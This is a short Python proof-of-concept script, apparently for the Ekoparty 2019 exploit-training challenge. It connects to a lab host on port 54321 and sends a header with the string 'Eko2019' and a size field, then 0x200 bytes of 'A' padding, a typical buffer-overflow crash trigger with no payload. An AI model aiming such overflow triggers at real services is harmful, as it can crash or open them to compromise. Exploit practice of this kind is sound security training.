#!/usr/bin/python
import socket, sys
from struct import pack
import time

def main():
	server = "192.168.130.131"
	port = 54321

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))

	buf = b"Eko2019\x00"			#control string
	buf += pack("<i", 0x200)  		#size
	buf += b"A"*(0x10-len(buf))

	s.send(buf)

	#print(s.recv(1024))

	time.sleep(3)
	buf = b"A"*(0x200)

	s.send(buf)
	s.close()

	print("[+] Packet sent")
	sys.exit(0)


if __name__ == "__main__":
 	main()
